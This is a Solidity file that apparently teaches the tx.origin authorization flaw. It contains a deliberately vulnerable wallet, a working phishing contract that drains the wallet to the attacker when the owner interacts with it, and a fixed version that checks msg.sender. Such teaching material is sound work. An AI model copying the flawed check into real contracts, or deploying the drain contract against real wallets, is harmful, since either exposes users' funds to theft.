// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/**
 * @title VulnerableTxOriginWallet
 * @notice Flawed authorization relying on tx.origin instead of msg.sender
 */
contract VulnerableTxOriginWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    // VULNERABILITY: tx.origin checks the original transaction signer,
    // allowing malicious intermediary contracts to trick the owner into executing transactions!
    function transferTo(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner via tx.origin");
        (bool success, ) = to.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

/**
 * @title TxOriginAttacker
 * @notice Phishing contract that tricks owner into calling attack()
 */
contract TxOriginAttacker {
    VulnerableTxOriginWallet public immutable target;
    address payable public immutable attacker;

    constructor(address _target) {
        target = VulnerableTxOriginWallet(payable(_target));
        attacker = payable(msg.sender);
    }

    receive() external payable {
        target.transferTo(attacker, address(target).balance);
    }

    // Owner interacts with this contract (e.g., claiming a free NFT or clicking a malicious link)
    fallback() external payable {
        target.transferTo(attacker, address(target).balance);
    }
}

/**
 * @title SecureTxOriginWallet
 * @notice Hardened contract checking msg.sender directly
 */
contract SecureTxOriginWallet {
    error Unauthorized();
    error TransferFailed();

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function transferTo(address payable to, uint256 amount) external {
        if (msg.sender != owner) revert Unauthorized();
        (bool success, ) = to.call{value: amount}("");
        if (!success) revert TransferFailed();
    }
}
